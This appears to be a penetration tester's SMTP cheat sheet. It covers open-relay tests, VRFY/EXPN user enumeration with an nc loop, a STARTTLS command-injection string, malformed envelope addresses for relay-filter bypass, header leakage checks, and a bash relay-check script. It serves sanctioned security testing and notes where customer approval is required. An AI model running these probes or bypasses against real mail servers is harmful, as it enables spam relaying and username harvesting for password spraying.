# Open Relay Testing

## Overview

Confirm whether the server accepts mail from an external sender to an external recipient.

## Commands

Manual telnet (port 25):
    telnet <target IP> 25
    EHLO test.local
    MAIL FROM:<root@target.com>
    RCPT TO:<user@gmail.com>
    DATA
    Subject: Relay test
    Relay test body.
    .
    QUIT

Submission port (try if 25 is blocked):
    openssl s_client -connect <target IP>:587 -starttls smtp

sendemail:
    sendemail -f root@target.com -t user@gmail.com -u "Relay test" -m "Relay test body" -s <target IP>

swaks:
    swaks --to user@gmail.com --from root@target.com --server <target IP> --port 25
    swaks --to user@gmail.com --from root@target.com --server <target IP> --port 587 --tls

nmap:
    nmap -p25,465,587 --script=smtp-open-relay,smtp-commands <target IP>

## Validation / False Positives

Open relay requires acceptance of an external RCPT (250 after RCPT TO) and successful delivery or queueing — not merely an open TCP port.
A 550 on external RCPT after DATA may still mean internal relay only — document internal vs external tests separately.
Only test external relay with customer approval.


# User Enumeration

## Overview

VRFY and EXPN reveal valid usernames when enabled. Many servers disable both.

## Commands

VRFY:
    telnet <target IP> 25
    VRFY root
    VRFY idontexist
    QUIT

VRFY loop:
    while read -r user; do
        echo "VRFY $user" | nc -nv -w 2 <target IP> 25 2>/dev/null | grep -E '^250|^252'
    done < users.txt

EXPN:
    telnet <target IP> 25
    EXPN mailinglist
    QUIT

swaks:
    swaks --server <target IP> --port 25 --vrfy root

## Validation / False Positives

250/252 on VRFY suggests the address exists; 550 on a decoy does not prove VRFY is disabled globally.
EXPN may list distribution lists — treat output as usernames for further spraying, not as proof of mailbox login.


# STARTTLS Command Injection

## Overview

Some MTAs mishandle smuggled commands after STARTTLS negotiation. Applies only to vulnerable versions — confirm with vendor/CVE context.

## Payloads / Techniques

Inject after STARTTLS:
    STARTTLS\r\nRSET\r\n

Expected vulnerable responses may include:
    220 Server ready / Ready to start TLS
    250 OK Reset

Manual probe:
    telnet <target IP> 25
    EHLO test.local
    STARTTLS
    # Send smuggled command sequence per test plan

## Validation / False Positives

A normal STARTTLS banner exchange is not a finding — demonstrate unauthorized command execution or mail routing change.


# Relay Bypass Formatting

## Overview

Malformed envelope addresses sometimes bypass weak relay filters.

## Payloads / Techniques

HELO <anything>
Identical to/from: mail from:<nobody@domain> rcpt to:<nobody@domain>
Unknown domain: mail from:<user@unknown_domain>
Domain not present: mail from:<user@localhost>
Domain not supplied: mail from:<user>
Source omission: mail from:<> rcpt to:<nobody@recipient_domain>
Target server IP in path: mail from:<user@domain> rcpt to:<nobody@recipient_domain@[IP Address]>
Quoted recipient: mail from:<user@domain> rcpt to:<"user@recipient-domain">
Disparate formatting: mail from:<user@[IP Address]> rcpt to:<@domain:nobody@recipient-domain>

## Validation / False Positives

Bypass attempts that still return 550 on RCPT TO are not relay — capture full SMTP transcript in the report.


# Header Analysis

## Overview

Received test messages may leak internal hostnames and RFC1918 addresses in headers.

## Commands

Send a test message through an allowed path (internal relay or web form).
View full message headers in the received copy.
Look for:
    Received: lines with internal FQDNs
    X-Originating-IP or X-Authenticated-User
    Private ranges (10.x, 172.16–31.x, 192.168.x)

## Validation / False Positives

A single internal hostname in a Received header is informational — pair with scope discussion on internal network disclosure.


# Relay Check Script

## Commands

#!/bin/bash
# Usage: ./smtp-relay-check.sh <host> [port]

HOST=$1
PORT=${2:-25}
TMP=$(mktemp)

if [[ -z "$HOST" ]]; then
    echo "Usage: $0 <host> [port]"
    exit 1
fi

cat > "$TMP" <<EOF
ehlo test.local
mail from:<root@target.com>
rcpt to:<user@gmail.com>
data
Subject: SMTP relay test
Relay test from $HOST
.
quit
EOF

echo "[*] Testing $HOST:$PORT"
nc -nv -w 5 "$HOST" "$PORT" < "$TMP"
rm -f "$TMP"

## Validation / False Positives

Script output showing 250 after RCPT TO still requires approval before sending to real third-party addresses — use a recipient you control.
